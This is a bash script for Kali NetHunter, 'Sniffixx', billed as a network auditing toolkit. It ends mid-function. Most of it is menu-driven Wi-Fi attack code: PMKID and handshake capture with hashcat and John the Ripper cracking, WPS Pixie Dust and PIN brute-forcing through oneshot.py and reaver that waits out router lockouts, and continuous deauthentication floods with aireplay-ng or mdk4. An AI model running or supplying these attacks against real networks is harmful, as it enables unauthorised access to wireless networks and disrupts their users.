#!/bin/bash
VERSION="1.0.0"

# Parse CLI arguments
case "${1:-}" in
    --help|-h)
        echo "Sniffixx - Network Auditing Toolkit for NetHunter"
        echo ""
        echo "Usage: sniffixx [options]"
        echo ""
        echo "Options:"
        echo "  --help, -h     Show this help message"
        echo "  --version, -v  Show version information"
        echo ""
        echo "For more info, visit: https://github.com/dtrail/sniffixx"
        exit 0
        ;;
    --version|-v)
        echo "Sniffixx version $VERSION"
        exit 0
        ;;
esac

echo
echo "...made by G@diZ for NetHunter"
echo
# create workdir
workdir="/sniffixx"

if [ "$(pwd)" != "$workdir" ]; then
  mkdir -p "$workdir"
  mkdir -p "$workdir/hs"
  mkdir -p "$workdir/wps"
  mkdir -p "$workdir/dump"
  mkdir -p "$workdir/dump/tcp"
  mkdir -p "$workdir/dump/pmkid"
  mkdir -p "$workdir/dump/tshark"
  mkdir -p "$workdir/dump/22000"
fi 

# Define global directories
handshake_dir="$workdir/hs"
pmkid_dir="$workdir/dump/pmkid"
log_dir="$workdir/logs"

: "${SNX_ONESHOT:=/sdcard/nh_files/modules/oneshot.py}"

PIN_FILE="$workdir/wps-pins-all-possible.txt"

download_pin_file() {
    local target_dir="$1"
    local pin_url="https://raw.githubusercontent.com/dtrail/sniffixx/pins/wps-pins-all-possible.txt"
    local pin_file="$target_dir/wps-pins-all-possible.txt"
    
    if [[ -f "$pin_file" ]]; then
        return 0
    fi
    
    echo -e "${YELLOW}Downloading WPS PIN file (90MB)...${NC}"
    if curl -L -o "$pin_file" "$pin_url" 2>/dev/null; then
        echo -e "${GREEN}✓ PIN file downloaded${NC}"
        return 0
    else
        echo -e "${RED}✗ Failed to download PIN file${NC}"
        echo "Download manually from: $pin_url"
        return 1
    fi
}

# hcxdumptool version detection
check_hcxdumptool_version() {
    local version
    version=$(hcxdumptool --version 2>&1 | head -1 || echo "unknown")
    if [[ "$version" =~ ^7\.[0-9]+ ]]; then
        echo "v7"
    else
        echo "v6"
    fi
}

# Detect and store version
HCX_VERSION="v6"
if command -v hcxdumptool &>/dev/null; then
    HCX_VERSION=$(check_hcxdumptool_version)
fi

# Check for required dependencies
check_dependencies() {
    local missing=()
    local tools=("airodump-ng" "hcxdumptool" "python3")
    
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &>/dev/null; then
            missing+=("$tool")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${yellow}WARNING: Missing dependencies:${NC}"
        for m in "${missing[@]}"; do
            echo -e "  - $m"
        done
        echo -e "${yellow}Some features may not work.${NC}"
        echo ""
    fi
}

# Run dependency check at startup
check_dependencies

# Session logging functions
log_action() {
    local action="$1"
    local target="${2:-}"
    local timestamp
    timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    mkdir -p "$log_dir"
    echo "[$timestamp] $action${target:+: $target}" >> "$log_dir/session_$(date +%Y%m%d).log"
}


# Show session summary
show_session_summary() {
    echo ""
    echo -e "${yellow}=== Session Summary ===${NC}"
    echo ""
    
    if [[ -f "$log_dir/results.log" ]]; then
        local handshake_count
        local pmkid_count
        local wps_count
        handshake_count=$(grep -c "handshake" "$log_dir/results.log" 2>/dev/null || echo "0")
        pmkid_count=$(grep -c "pmkid" "$log_dir/results.log" 2>/dev/null || echo "0")
        wps_count=$(grep -c "wps_pin" "$log_dir/results.log" 2>/dev/null || echo "0")
        
        echo "Captured:"
        echo "  - Handshakes: $handshake_count"
        echo "  - PMKIDs: $pmkid_count"
        echo "  - WPS PINs cracked: $wps_count"
        echo ""
        echo "See $log_dir/results.log for details"
    else
        echo "No results captured this session."
    fi
}

log_result() {
    local result_type="$1"
    local value="$2"
    local timestamp
    timestamp=$(date +"%Y-%m-%d %H:%M:%S")
    mkdir -p "$log_dir"
    echo "[$timestamp] RESULT: $result_type = $value" >> "$log_dir/results.log"
}



# cd $workdir

# Input validation functions
validate_bssid() {
    local bssid="$1"
    if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        return 0
    else
        echo "Invalid BSSID format: $bssid"
        return 1
    fi
}

validate_wps_pin() {
    local pin="$1"
    if [[ "$pin" =~ ^[0-9]{8}$ ]]; then
        return 0
    else
        echo "Invalid WPS PIN: $pin (must be 8 digits)"
        return 1
    fi
}

validate_mac() {
    local mac="$1"
    if [[ "$mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        return 0
    else
        echo "Invalid MAC address: $mac"
        return 1
    fi
}

validate_ip() {
    local ip="$1"
    if [[ "$ip" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        return 0
    else
        echo "Invalid IP address: $ip"
        return 1
    fi
}

check_oneshot() {
    if [ ! -f "$SNX_ONESHOT" ]; then
        echo "WARNING: oneshot.py not found at $SNX_ONESHOT"
        echo "Set SNX_ONESHOT environment variable to the correct path."
        echo "WPS attacks will not be available."
        return 1
    fi
    return 0
}


# Function to list available Wi-Fi adapters
list_adapters() {
    echo "Available Wi-Fi adapters:"
    local count=0
    local adapter_list=()
    
    while IFS= read -r iface; do
        count=$((count + 1))
        adapter_list+=("$iface")
        echo " $count) $iface"
    done < <(ls /sys/class/net 2>/dev/null | grep -E '^wlan' | sort)
    
    if [ $count -eq 0 ]; then
        echo "  No Wi-Fi adapters found."
        return 1
    fi
    
    # Store adapters globally for selection
    ADAPTERS=("${adapter_list[@]}")
    ADAPTER_COUNT=$count
}

#reset adapter
reset_adapter() {
      echo "Resetting adapter..."
        if [ -z "$adapter" ]; then
                    echo "No adapter selected. Please select a Wi-Fi adapter first."
                else
                     ip link set "$adapter" down
                     sleep 1;
                     ip link set "$adapter" up
                     echo "...done!"
                fi
}

# scan 
dump_networks() {
  timestamp=$(date +"%Y-%m-%d_%H-%M-%S")
airodump-ng "$adapter" -w "$workdir/dump/dump_$timestamp" --manufacturer --band abg
}

# Function to sniff with tcpdump
sniff_tcpdump() {
    echo "Starting tcpdump on $1..."
    sudo tcpdump -i $1 -w "$workdir/dump/tcp/${1}_tcpdump_$(date +%F_%T).pcap"
}

# Function to sniff with tshark
sniff_tshark() {
    echo "Starting tshark on $1..."
    sudo tshark -i $1 -w "$workdir/dump/tshark/${1}_tshark_$(date +%F_%T).pcap"
}


# Function to capture PMKID with timestamped output
capture_pmkid() {
    local iface="$1"
    local date_stamp
    local base_name
    local counter
    local capture_file
    local tshark_file

    echo "📡 Starting PMKID capture on interface: $iface"
    date_stamp=$(date +"%d%m%y")
    base_name="pmkid_capture_${date_stamp}"
    counter=1

    mkdir -p "$workdir/dump/pmkid" "$workdir/dump/tshark"

    while [[ -e "$workdir/dump/pmkid/${base_name}_${counter}.pcapng" ]]; do
        ((counter++))
    done

    capture_file="$workdir/dump/pmkid/${base_name}_${counter}.pcapng"

    # Ask if user wants to run tshark in parallel
    read -p "📦 Run tshark in parallel to capture full traffic? [y/N]: " run_tshark
    run_tshark="${run_tshark,,}"  # lowercase

    if [[ "$run_tshark" == "y" ]]; then
        tshark_file="$workdir/dump/tshark/${base_name}_${counter}_full.pcapng"
        echo "🧪 Starting silent tshark capture to: $tshark_file"
        tshark -i "$iface" -w "$tshark_file" >/dev/null 2>&1 &
        tshark_pid=$!
    fi

    echo "🚀 Running hcxdumptool (foreground output enabled)..."
    if [[ "$HCX_VERSION" == "v7" ]]; then
        sudo hcxdumptool -i "$iface" -o "$capture_file" --enable_status=1
    else
        sudo hcxdumptool -i "$iface" -w "$capture_file" -F --rds=1 --enable_status=1
    fi

    echo "✅ PMKID capture saved to: $capture_file"

    # Stop tshark if it was running
    if [[ -n "$tshark_pid" ]]; then
        echo "🛑 Stopping tshark..."
        kill "$tshark_pid" 2>/dev/null
        echo "✅ Full traffic saved to: $tshark_file"
    fi
}

list_pmkid_entries() {
    local hash_dir="$workdir/dump/22000"
    echo "📂 Choose hash format to inspect:"
    echo "1) Hashcat (.22000)"
    echo "2) John the Ripper (.john)"
    read -p "Select format: " format

    case "$format" in
    1)
        mapfile -t files < <(find "$hash_dir" -type f -name "*.22000" | sort -r)
        ;;
    2)
        mapfile -t files < <(find "$hash_dir/john" -type f -name "*.john" | sort -r)
        ;;
    *)
        echo "❌ Invalid format."
        return
        ;;
    esac

    if [[ ${#files[@]} -eq 0 ]]; then
        echo "❌ No matching files found."
        return
    fi

    echo "📂 Available files:"
    for i in "${!files[@]}"; do
        echo "$((i+1))) ${files[$i]}"
    done

    read -p "Select file number: " selection
    selected="${files[$((selection-1))]}"

    echo "🔍 Extracting entries from: $selected"
    echo "-------------------------------------"

    if [[ "$format" == "1" ]]; then
        awk -F '*' '/^WPA\*/ {
            essid=substr($6,1,length($6)/2)
            mac_ap=$4
            mac_sta=$5
            pmkid=$3
            printf "%d) SSID: %s | AP: %s | STA: %s | PMKID: %s\n", NR, essid, mac_ap, mac_sta, pmkid
        }' "$selected"
    else
        awk -F ':' '{printf "%d) SSID: %s | Hash: %s\n", NR, $1, $2}' "$selected"
    fi

    read -p "Select entry number to extract: " entry
    output_dir="$workdir/dump/22000/extracted"
    mkdir -p "$output_dir"
    output_file="$output_dir/entry_${entry}_$(basename "$selected")"

    echo "💾 Saving selected entry to: $output_file"
    sed -n "${entry}p" "$selected" > "$output_file"
}

# Function to convert selected pcapng to 22000 with matching name
convert_selected_pmkid() {
    local pmkid_dir="$workdir/dump/pmkid"
    local tshark_dir="$workdir/dump/tshark"
    local output_dir="$workdir/dump/22000"
    local john_dir="$output_dir/john"
    mkdir -p "$output_dir" "$john_dir"

    echo "🔍 Searching for .pcapng files in $pmkid_dir..."
    mapfile -t pcapng_files < <(find "$pmkid_dir" -type f -name "*.pcapng" | sort -r)

    if [[ ${#pcapng_files[@]} -eq 0 ]]; then
        echo "❌ No .pcapng files found in $pmkid_dir."
        return
    fi

    echo "📂 Available .pcapng files:"
    for i in "${!pcapng_files[@]}"; do
        echo "$((i+1))) ${pcapng_files[$i]}"
    done

    read -p "Select pcapng file number to convert: " selection
    selected_pcap="${pcapng_files[$((selection-1))]}"
    base_name="$(basename "${selected_pcap%.pcapng}")"
    output_path="$output_dir/${base_name}.22000"
    john_path="$john_dir/${base_name}.john"

    echo "💾 Choose output format:"
    echo "1) Hashcat (.22000)"
    echo "2) John the Ripper (.john)"
    echo "3) Both"
    echo "4) Extract single APs from converted capture file"
    read -p "Select format: " format_choice

    echo "⚙️ Converting $selected_pcap..."

    case "$format_choice" in
        1)
            hcxpcapngtool -o "$output_path" "$selected_pcap"
            ;;
        2)
            hcxpcapngtool --john="$john_path" "$selected_pcap"
            ;;
        3)
            hcxpcapngtool -o "$output_path" --john="$john_path" "$selected_pcap"
            ;;
        4)
            list_pmkid_entries
            ;;
        *)
            echo "❌ Invalid format selection."
            return
            ;;
    esac

    # Validate .22000
    if [[ "$format_choice" == "1" || "$format_choice" == "3" ]]; then
        if grep -q '^WPA\*' "$output_path"; then
            count=$(grep -c '^WPA\*' "$output_path")
            echo "✅ Valid WPA hash found — $count entries saved to: $output_path"
        else
            echo "🗑️ No valid WPA hashes found — deleting $output_path"
            rm -f "$output_path"
        fi
    fi

    # Validate .john
    if [[ "$format_choice" == "2" || "$format_choice" == "3" ]]; then
        if grep -q ':' "$john_path"; then
            echo "✅ John-format hash saved to: $john_path"
        else
            echo "🗑️ No valid John hashes found — deleting $john_path"
            rm -f "$john_path"
        fi
    fi

    # Optional tshark conversion
    tshark_base="${base_name}_full.pcapng"
    tshark_file="$tshark_dir/$tshark_base"

    if [[ -f "$tshark_file" ]]; then
        read -p "🧪 Convert full tshark capture too? [$tshark_file] [y/N]: " convert_tshark
        convert_tshark="${convert_tshark,,}"

        if [[ "$convert_tshark" == "y" ]]; then
            tshark_base_name="${tshark_base%.pcapng}"
            tshark_output="$output_dir/${tshark_base_name}.22000"
            tshark_john="$john_dir/${tshark_base_name}.john"

            echo "⚙️ Converting $tshark_file → $tshark_output"

            case "$format_choice" in
                1)
                    hcxpcapngtool -o "$tshark_output" "$tshark_file"
                    ;;
                2)
                    hcxpcapngtool --john="$tshark_john" "$tshark_file"
                    ;;
                3)
                    hcxpcapngtool -o "$tshark_output" --john="$tshark_john" "$tshark_file"
                    ;;
            esac

            # Validate tshark .22000
            if [[ "$format_choice" == "1" || "$format_choice" == "3" ]]; then
                if grep -q '^WPA\*' "$tshark_output"; then
                    count=$(grep -c '^WPA\*' "$tshark_output")
                    echo "✅ Valid WPA hash found — $count entries saved to: $tshark_output"
                else
                    echo "🗑️ No valid WPA hashes found — deleting $tshark_output"
                    rm -f "$tshark_output"
                fi
            fi

            # Validate tshark .john
            if [[ "$format_choice" == "2" || "$format_choice" == "3" ]]; then
                if grep -q ':' "$tshark_john"; then
                    echo "✅ John-format hash saved to: $tshark_john"
                else
                    echo "🗑️ No valid John hashes found — deleting $tshark_john"
                    rm -f "$tshark_john"
                fi
            fi
        fi
    fi
}

# Function to crack PMKID hashes with interactive selection
# NOTE: WPS functions are defined AFTER this to maintain logical flow

pmkid_crack_menu() {
    local hash_dir="$workdir/dump/22000"
    local john_dir="$workdir/dump/22000/john"
    local extracted_dir="$workdir/dump/22000/extracted"
    mkdir -p "$john_dir" "$extracted_dir"

    echo "🛠️ Choose cracking tool:"
    echo "1. Hashcat (.22000)"
    echo "2. John the Ripper (.john)"
    echo "3. aircrack-ng (.22000)"
    echo "4. Check installed wordlists"
    echo "5. Back to main menu"
    read -p "Select an option: " tool_choice

    case $tool_choice in
    1|3)
        echo "📂 Available .22000 hash files (full + extracted):"
        shopt -s nullglob
        mapfile -t full_files < <(find "$hash_dir" -maxdepth 1 -type f -name "*.22000" | sort -r)
        mapfile -t extracted_files < <(find "$extracted_dir" -type f -name "*.22000" | sort -r)
        shopt -u nullglob

        hash_files=("${full_files[@]}" "${extracted_files[@]}")

        if [[ ${#hash_files[@]} -eq 0 ]]; then
            echo "❌ No .22000 hash files found."
            return
        fi

        for i in "${!hash_files[@]}"; do
            label=""
            [[ "${hash_files[$i]}" == "$extracted_dir"* ]] && label=" (extracted)"
            echo "$((i+1))) ${hash_files[$i]}$label"
        done

        read -p "Select hash file number to crack: " selection
        selected_hash="${hash_files[$((selection-1))]}"

        read -p "Enter the path to your wordlist: " wordlist
        [[ ! -f "$wordlist" ]] && echo "❌ Wordlist not found: $wordlist" && return

        if [[ "$tool_choice" == "1" ]]; then
            echo "🚀 Running Hashcat..."
            hashcat -D 1 -m 22000 "$selected_hash" "$wordlist"
        else
            echo "🚀 Running aircrack-ng..."
            aircrack-ng -w "$wordlist" -J "${selected_hash%.22000}" "$selected_hash"
        fi
        ;;

    2)
        echo "📂 Available .john hash files (full + extracted):"
        shopt -s nullglob
        mapfile -t full_john < <(find "$john_dir" -maxdepth 1 -type f -name "*.john" | sort -r)
        mapfile -t extracted_john < <(find "$extracted_dir" -type f -name "*.john" | sort -r)
        shopt -u nullglob

        john_files=("${full_john[@]}" "${extracted_john[@]}")

        if [[ ${#john_files[@]} -eq 0 ]]; then
            echo "❌ No .john hash files found."
            return
        fi

        for i in "${!john_files[@]}"; do
            label=""
            [[ "${john_files[$i]}" == "$extracted_dir"* ]] && label=" (extracted)"
            echo "$((i+1))) ${john_files[$i]}$label"
        done

        read -p "Select hash file number to crack: " selection
        selected_john="${john_files[$((selection-1))]}"

        read -p "Enter the path to your wordlist: " wordlist
        [[ ! -f "$wordlist" ]] && echo "❌ Wordlist not found: $wordlist" && return

        echo "🚀 Running John the Ripper..."
        john --format=wpapsk --wordlist="$wordlist" "$selected_john"
        ;;

    4)
        wordlist_helper
        ;;
    5)
        echo "Returning to main menu."
        ;;
    *)
        echo "❌ Invalid option."
        ;;
    esac
}

wordlist_helper() {
    echo "=== Wordlist Helper ==="
    echo ""
    echo "Common wordlist locations:"
    ls -la /usr/share/wordlists/ 2>/dev/null || echo "No wordlists found in /usr/share/wordlists/"
    echo ""
    echo "Download additional wordlists:"
    echo "  sudo apt install wordlists"
    echo "  or use: wget https://github.com/assetnote/wordlists/releases"
}

# WPS Attack Environment - Pixie Dust Menu
pixie_dust_menu() {
    echo "Preparing for WPS Attacks..."
    sleep 1
    echo ""
    echo "Checking adapter..."
    echo ""
    if [[ "$adapter" != "wlan2" && "$adapter" != "wlan3" ]]; then
        echo "internal adapter in use."
        echo "If your internal adapter is currently in monitor mode, please head to another shell instance and disable it first, then press Enter to continue..."
        read
    else
        echo "external adapter detected."
        echo "Disabling monitor mode..."
        airmon-ng stop "$adapter"
        clear
    fi
    echo "Executing WPS-Attack-Environment"
    
    check_oneshot || { echo "WPS attacks unavailable."; return 1; }
    
    while true; do
        echo ""
        echo "Choose attack option"
        echo "1. Pixie Dust"
        echo "2. Pixie Force"
        echo "3. Online Brute Force"
        echo "4. Null Pin"
        echo "5. Custom Pin"
        echo "6. Attack with pre-computed PINs"
        echo "7. Loop Mode"
        echo "8. Special Brute Force (PIN file)"
        echo "9. Back to main menu"
        
        read -p "Choose an option: " option
        
        case $option in
            1)
                if [ -z "$adapter" ]; then
                    echo "No adapter selected. Please select a Wi-Fi adapter first."
                else
                    python3 "$SNX_ONESHOT" -w -i "$adapter" -K
                fi
                ;;
            2)
                if [ -z "$adapter" ]; then
                    echo "No adapter selected. Please select a Wi-Fi adapter first."
                else
                    python3 "$SNX_ONESHOT" -w -i "$adapter" -F
                fi
                ;;
            3)
                if [ -z "$adapter" ]; then
                    echo "No adapter selected. Please select a Wi-Fi adapter first."
                else
                    python3 "$SNX_ONESHOT" -w -i "$adapter" -B
                fi
                ;;
            4)
                if [ -z "$adapter" ]; then
                    echo "No adapter selected. Please select a Wi-Fi adapter first."
                else
                    python3 "$SNX_ONESHOT" -w -i "$adapter" -p 00000000
                fi
                ;;
            5)
                if [ -z "$adapter" ]; then
                    echo "No adapter selected. Please select a Wi-Fi adapter first."
                else
                    read -p "Enter an 8-digit pin: " cuspin
                    python3 "$SNX_ONESHOT" -w -i "$adapter" -p "$cuspin"
                fi
                ;;
            6)
                if [ -z "$adapter" ]; then
                    echo "No adapter selected. Please select a Wi-Fi adapter first."
                else
                    python3 "$SNX_ONESHOT" --vuln-list=vulnwsc.txt -w -i "$adapter"
                fi
                ;;
            7)
                if [ -z "$adapter" ]; then
                    echo "No adapter selected. Please select a Wi-Fi adapter first."
                else
                    python3 "$SNX_ONESHOT" --vuln-list=vulnwsc.txt -w -i "$adapter" -l
                fi
                ;;
            8)
                special_bruteforce_menu
                ;;
            9)
                break
                ;;
            *)
                echo "Invalid option."
                ;;
        esac
    done
}

# Special Brute Force using PIN file
special_bruteforce_menu() {
    if [[ -z "$adapter" ]]; then
        echo "No adapter selected. Please select a Wi-Fi adapter first."
        return 1
    fi
    
    echo ""
    echo "=== Special Brute Force (PIN File) ==="
    read -p "Enter target BSSID: " bssid
    
    if ! [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        echo "Invalid BSSID format (expected: XX:XX:XX:XX:XX:XX)"
        return 1
    fi
    
    echo ""
    echo "Configure attack options:"
    read -p "Delay between attempts (seconds) [1]: " delay
    delay="${delay:-1}"
    read -p "Lock timeout when WPS locked (seconds) [300]: " lock_timeout
    lock_timeout="${lock_timeout:-300}"
    read -p "Max lock retries before giving up [3]: " max_retries
    max_retries="${max_retries:-3}"
    
    echo ""
    echo "Select attack method:"
    echo "1. oneshot.py (fast, WiFi interface)"
    echo "2. Monitor mode (reaver, requires monitor mode)"
    read -p "Choice [1]: " method
    method="${method:-1}"
    
    case $method in
        1)
            echo "Using oneshot.py with PIN file..."
            if [[ ! -f "$SNX_ONESHOT" ]]; then
                echo "oneshot.py not found at $SNX_ONESHOT"
                return 1
            fi
            if [[ ! -f "$PIN_FILE" ]]; then
                download_pin_file "$workdir" || return 1
            fi
            
            lock_count=0
            pin_tried=0
            pin_found=0
            
            while IFS= read -r pin || [[ -n "$pin" ]]; do
                [[ "$pin" =~ ^[0-9]{4,8}$ ]] || continue
                ((pin_tried++))
                
                echo "[$pin_tried] Trying PIN: $pin"
                output=$(python3 "$SNX_ONESHOT" -i "$adapter" -b "$bssid" -B --pin "$pin" 2>&1)
                echo "$output"
                
                if echo "$output" | grep -qi "success\|cracked\|found\|psk\|wpa"; then
                    echo "SUCCESS! PIN found: $pin"
                    echo "$bssid:$pin" >> "$workdir/wps_log.txt"
                    pin_found=1
                    break
                fi
                
                if echo "$output" | grep -qi "lock\|locked"; then
                    ((lock_count++))
                    echo "WPS lock detected! Waiting $lock_timeout seconds... (Attempt $lock_count/$max_retries)"
                    if [[ $lock_count -ge $max_retries ]]; then
                        echo "Max lock retries reached. Aborting."
                        break
                    fi
                    sleep "$lock_timeout"
                fi
                
                sleep "$delay"
            done < "$PIN_FILE"
            
            if [[ $pin_found -eq 0 ]]; then
                echo "PIN not found in file. Tried $pin_tried PINs."
            fi
            ;;
        2)
            echo "Using monitor mode with reaver..."
            if ! command -v reaver &>/dev/null; then
                echo "reaver not found. Install with: apt install reaver"
                return 1
            fi
            if ! command -v wash &>/dev/null; then
                echo "wash not found. Install with: apt install reaver"
                return 1
            fi
            
            local mon_adapter="${adapter}mon"
            airmon-ng start "$adapter" >/dev/null 2>&1
            
            if [[ ! -f "$PIN_FILE" ]]; then
                download_pin_file "$workdir" || { airmon-ng stop "$mon_adapter" >/dev/null 2>&1; return 1; }
            fi
            
            lock_count=0
            pin_tried=0
            pin_found=0
            
            echo "Starting reaver with PIN file..."
            while IFS= read -r pin || [[ -n "$pin" ]]; do
                [[ "$pin" =~ ^[0-9]{4,8}$ ]] || continue
                ((pin_tried++))
                
                echo "[$pin_tried] Trying PIN: $pin"
                output=$(reaver -i "$mon_adapter" -b "$bssid" -p "$pin" -d "$delay" -l "$lock_timeout" -vv 2>&1)
                echo "$output"
                
                if echo "$output" | grep -qi "success\|cracked\|wps key\|pin.*found"; then
                    echo "SUCCESS! PIN found: $pin"
                    echo "$bssid:$pin" >> "$workdir/wps_log.txt"
                    pin_found=1
                    break
                fi
                
                if echo "$output" | grep -qi "lock\|locked"; then
                    ((lock_count++))
                    echo "WPS lock detected! Waiting $lock_timeout seconds... (Attempt $lock_count/$max_retries)"
                    if [[ $lock_count -ge $max_retries ]]; then
                        echo "Max lock retries reached. Aborting."
                        break
                    fi
                    sleep "$lock_timeout"
                fi
            done < "$PIN_FILE"
            
            if [[ $pin_found -eq 0 ]]; then
                echo "PIN not found in file. Tried $pin_tried PINs."
            fi
            
            airmon-ng stop "$mon_adapter" >/dev/null 2>&1
            ;;
        *)
            echo "Invalid choice"
            ;;
    esac
}

# Function to enable monitor mode
enable_monitor_mode() {
    local iface="${1:-$adapter}"
    
    # Try iw first (most universal)
    if command -v iw &>/dev/null; then
        ip link set "$iface" down 2>/dev/null
        iw "$iface" set monitor none 2>/dev/null
        ip link set "$iface" up 2>/dev/null
        echo "Monitor mode enabled on $iface (using iw)"
        return 0
    fi
    
    # Fallback to airmon-ng
    if command -v airmon-ng &>/dev/null; then
        airmon-ng start "$iface"
        echo "Monitor mode enabled on $iface (using airmon-ng)"
        return 0
    fi
    
    echo "ERROR: No method available to enable monitor mode"
    return 1
}

# Function to disable monitor mode
disable_monitor_mode() {
    local iface="${1:-$adapter}"
    
    # Try iw first
    if command -v iw &>/dev/null; then
        ip link set "$iface" down 2>/dev/null
        iw "$iface" set type managed 2>/dev/null
        ip link set "$iface" up 2>/dev/null
        echo "Monitor mode disabled on $iface (using iw)"
        return 0
    fi
    
    # Fallback to airmon-ng
    if command -v airmon-ng &>/dev/null; then
        airmon-ng stop "$iface"
        echo "Monitor mode disabled on $iface (using airmon-ng)"
        return 0
    fi
    
    echo "ERROR: No method available to disable monitor mode"
    return 1
}

# Monitor mode menu
monitor_mode_menu() {
    while true; do
        echo "Monitor Mode Menu"
        echo "1. Enable monitor mode"
        echo "2. Disable monitor mode"
        echo "3. Back to main menu"

        read -p "Choose an option: " option

        case $option in
            1)
                if [ -z "$adapter" ]; then
                    echo "No adapter selected. Please select a Wi-Fi adapter first."
                else
                    enable_monitor_mode $adapter
                fi
                ;;
            2)
                if [ -z "$adapter" ]; then
                    echo "No adapter selected. Please select a Wi-Fi adapter first."
                else
                    disable_monitor_mode $adapter
                fi
                ;;
            3)
                break
                ;;
            *)
                echo "Invalid option."
                ;;
        esac
    done
}


scan_wps_networks() {
    echo -e "${yellow}Scanning for WPS-enabled networks...${nc}"
    sudo airmon-ng check kill

    # Run wash and skip header
    results=$(sudo wash -i "$adapter" -2 2>/dev/null | awk 'NR>2' | grep -v '^$')
    if [ -z "$results" ]; then
        echo -e "${red}No WPS-enabled networks found.${nc}"
        return
    fi

    # Store and number the entries
    IFS=$'\n' read -d '' -r -a networks <<< "$results"
    echo -e "${blue}Available WPS networks:${nc}"
    for i in "${!networks[@]}"; do
        echo "$((i+1)). ${networks[$i]}"
    done

    read -p "Enter the number of the network to select: " selection
    if ! [[ "$selection" =~ ^[0-9]+$ ]] || (( selection < 1 || selection > ${#networks[@]} )); then
        echo -e "${red}Invalid selection.${nc}"
        return
    fi

    selected_entry="${networks[$((selection - 1))]}"
    selected_bssid=$(echo "$selected_entry" | awk '{print $1}')
    selected_essid=$(echo "$selected_entry" | cut -d ' ' -f 6- | sed 's/ *$//')

    echo -e "${green}Selected BSSID:${nc} $selected_bssid"
    echo -e "${green}Selected ESSID:${nc} $selected_essid"
}

# WPS Crack using selected network
wps_crack() {
    if [[ -z "$adapter" ]]; then
        echo "No adapter selected. Please select a Wi-Fi adapter first."
        return 1
    fi
    
    local target_bssid="$selected_bssid"
    local pin_file="/sniffixx/wps_pins.txt"
    local timeout_duration=10
    
    if [ -z "$target_bssid" ]; then
        echo "No network selected. Please select a network first."
        return 1
    fi
    
    if [ ! -f "$pin_file" ]; then
        echo "PIN file not found: $pin_file"
        return 1
    fi
    
    echo "Starting WPS brute-force attack on $target_bssid..."
    while IFS= read -r pin; do
        echo "Trying PIN: $pin"
        output=$(timeout "$timeout_duration" reaver -i "$adapter" -b "$target_bssid" -p "$pin" -vv 2>&1)
        if echo "$output" | grep -q "WPS transaction completed successfully"; then
            echo "Success! Correct PIN found: $pin"
            break
        fi
        echo "PIN $pin failed, moving to next..."
    done < "$pin_file"
}

# Handshake grabber
handshake_grabber_menu() {
    while true; do
        echo -e "${yellow}Handshake Grabber Menu${nc}"
        echo "1. Search for networks"
        echo "2. Capture PMKID of selected network"
        echo "3. Deauthentication attack with dual adapters"
        echo "4. Back to main menu"

        read -p "Choose an option: " option

        case $option in
            1)
                echo -e "${yellow}Scanning for networks on $adapter...${nc}"
                sudo airodump-ng "$adapter" -w "$handshake_dir/scan" --output-format csv --write-interval 1 &
                scan_pid=$!
                old_trap=$(trap -p SIGINT)
                trap '' SIGINT
                read -n1 -r -p "Press any key to stop the scan..." key
                echo ""
                trap - SIGINT
                sudo kill "$scan_pid"
                sleep 2
                echo -e "${blue}Available networks:${nc}"
                if [ -f "$handshake_dir/scan-01.csv" ]; then
                    awk -F',' 'NR>2 && $1!="" && NF>14 {print NR-2 " - BSSID: " $1 " | Kanal: " $4 " | ESSID: " $14}' "$handshake_dir/scan-01.csv"
                    read -p "Enter the number of the target network: " network_number
                    bssid=$(awk -F"," -v row="$((network_number + 2))" 'NR==row {print $1}' "$handshake_dir/scan-01.csv")
                    essid=$(awk -F"," -v row="$((network_number + 2))" 'NR==row {print $14}' "$handshake_dir/scan-01.csv")
                    echo "$bssid" > "$handshake_dir/filterlist_ap.txt"
                    echo -e "${green}Netzwerk $essid (BSSID: $bssid) added to filter list.${nc}"
                else
                    echo -e "${red}Datei $handshake_dir/scan-01.csv not found. Please run scan again!${nc}"
                fi
                ;;
            2)
                echo -e "${yellow}Capturing PMKID on $adapter...${nc}"
                if [ -z "$bssid" ]; then
                    echo -e "${red}No network selected! Please scan and select a network first.${nc}"
                else
                    read -p "Overwrite existing pmkid.pcapng? (y/n): " overwrite
                    if [[ "$overwrite" =~ ^[Yy]$ ]]; then
                        output_file="$pmkid_dir/pmkid.pcapng"
                    else
                        output_file="$pmkid_dir/pmkid_$(date +%F_%T).pcapng"
                    fi
                    sudo hcxdumptool -i "$adapter" --enable_status=1 -o "$output_file" --filtermode=2 --filterlist_ap="$handshake_dir/filterlist_ap.txt"
                    echo -e "${green}PMKID saved to $output_file gespeichert.${nc}"
                fi
                ;;
            3)
                echo -e "${yellow}Select adapter for scanning:${nc}"
                list_adapters
                read -p "Enter the number of the adapter to use for scanning: " scan_adapter_number
                scan_adapter="${adapters[$((scan_adapter_number - 1))]}"
                echo -e "${yellow}Select adapter for deauthentication:${nc}"
                list_adapters
                read -p "Enter the number of the adapter to use for deauthentication: " deauth_adapter_number
                deauth_adapter="${adapters[$((deauth_adapter_number - 1))]}"
                if [ "$scan_adapter" == "$deauth_adapter" ]; then
                    echo -e "${yellow}Using $scan_adapter for both scanning and deauthentication.${nc}"
                fi
                echo -e "${yellow}Choose deauthentication tool:${nc}"
                echo "1. aireplay-ng"
                echo "2. mdk4"
                read -p "Select an option: " deauth_tool
                case $deauth_tool in
                    1)
                        echo -e "${yellow}Starting deauthentication attack with aireplay-ng...${nc}"
                        sudo aireplay-ng --deauth 0 -a "$bssid" "$deauth_adapter"
                        ;;
                    2)
                        echo -e "${yellow}Starting deauthentication attack with mdk4...${nc}"
                        sudo mdk4 "$deauth_adapter" d -B "$bssid"
                        ;;
                    *)
                        echo -e "${red}Invalid option. Returning to handshake grabber menu.${nc}"
                        ;;
                esac
                ;;
            4)
                return
                ;;
            *)
                echo -e "${red}Invalid option.${nc}"
                ;;
        esac
    done
}

enter_network()
{

trap 'echo "wscan was interrupted. Returning to main script..."' SIGINT

echo
echo "This will scan for networks and check your stored cracked APs. All known/cracked networks will be marked green."
echo
echo "Running wscan..."
echo
